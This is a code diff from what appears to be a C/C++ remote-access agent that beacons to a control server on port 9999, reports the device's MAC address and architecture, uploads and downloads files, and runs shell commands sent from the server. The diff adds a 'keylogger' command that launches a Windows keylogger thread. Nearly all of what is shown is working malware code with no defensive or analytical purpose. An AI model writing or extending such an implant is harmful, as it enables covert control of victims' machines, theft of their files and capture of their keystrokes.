@@ -4,11 +4,14 @@
 #include <stdbool.h>
 #include <cstdio>
 #include <cstring>
+#include <pthread.h>
+
+#include "includes/keylogger.h"
 
 #ifdef _WIN32
     #include <winsock2.h>
     #include <windows.h>
-    #include "cJSON/cJSON.h"
+    #include "includes/cJSON/cJSON.h"
     #include <unistd.h>
     //#include <Iphlpapi.h>
     //#include <Assert.h>
@@ -26,6 +29,7 @@
     #define file_path "/tmp/id"
     
 #endif
+
 #define PORT 9999
 #define ADDR "127.0.0.1"
 #define BUFFER_SIZE 4096
@@ -49,6 +53,7 @@ class Communicate_ {
     void upload();
     void download();
 };
+
 
 int main() {
     Communicate_ comm;
@@ -140,7 +145,6 @@ const char* Device::get_MAC() {
   
     AdapterInfo = (IP_ADAPTER_INFO *) malloc(sizeof(IP_ADAPTER_INFO));
     if (AdapterInfo == NULL) {
-      printf("Error allocating memory needed to call GetAdaptersinfo\n");
       free(mac_addr);
       return NULL; // it is safe to call free(NULL)
     }
@@ -149,7 +153,6 @@ const char* Device::get_MAC() {
       free(AdapterInfo);
       AdapterInfo = (IP_ADAPTER_INFO *) malloc(dwBufLen);
       if (AdapterInfo == NULL) {
-        printf("Error allocating memory needed to call GetAdaptersinfo\n");
         free(mac_addr);
         return NULL;
       }
@@ -200,6 +203,11 @@ const char* Device::get_Arch() {
 
 
 void Communicate_::beacon(const char *id) {
+    FILE *exec;
+    cJSON *re = cJSON_CreateObject();
+    char result[MAX_RESPONSE];
+    char command_with_redirect[BUFFER_SIZE + 10];
+
     cJSON *bea = cJSON_CreateObject();
     cJSON_AddStringToObject(bea, "mode", "beacon");
     cJSON_AddStringToObject(bea, "agent_id", id);
@@ -223,18 +231,24 @@ void Communicate_::beacon(const char *id) {
     cJSON *cmd = cJSON_GetObjectItem(reply, "command");
     // if command = "upload [file path]" | upload file to agent
     
-    if (strncmp(cmd->valuestring, "upload", 6) == 0) upload();
+    if (strncmp(cmd->valuestring, "upload", 6) == 0) {
+        upload();
     // if command = "download [file path]" | download file from agent
-    if (strncmp(cmd->valuestring, "download", 8) == 0) download();
-    
-    
-    // execute command
-    // char *result = exec(cmd->valuestring);
-    FILE *exec;
-    cJSON *re = cJSON_CreateObject();
-    char result[MAX_RESPONSE];
+    } else if (strncmp(cmd->valuestring, "download", 8) == 0) { 
+        download();
+    } else if (strncmp(cmd->valuestring, "keylogger", 9) == 0) {
+        pthread_t KeyloggerThread;
+        #ifdef _WIN32
+        // use thread 
+        pthread_create(&KeyloggerThread, NULL, StartWindowsKeylogger, NULL);
+        #else 
+        //pthread_create(&KeyloggerThread, NULL, StartLinuxKeylogger, NULL);
+        #endif
+
+        pthread_join(KeyloggerThread, NULL);
+    }
+
     memset(buffer, 0, sizeof(buffer));
-    char command_with_redirect[BUFFER_SIZE + 10];
     snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);
 
     #ifdef _WIN32
